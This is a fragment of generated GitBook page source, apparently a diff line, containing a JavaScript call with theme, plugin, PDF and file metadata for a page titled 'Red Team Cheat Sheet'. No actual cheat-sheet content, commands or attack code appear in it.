+            gitbook.page.hasChanged({"page":{"title":"Red Team Cheat Sheet","level":"4.1.1","depth":2,"previous":{"title":"Tools I Use","level":"4.1","depth":1,"path":"resources/tools.md","ref":"resources/tools.md","articles":[{"title":"Red Team Cheat Sheet","level":"4.1.1","depth":2,"path":"resources/redteamcheatsheet.md","ref":"resources/redteamcheatsheet.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"resources/redteamcheatsheet.md","mtime":"2026-02-27T05:48:40.143Z","type":"markdown"},"gitbook":{"version":"6.1.6","time":"2026-02-27T06:02:57.736Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
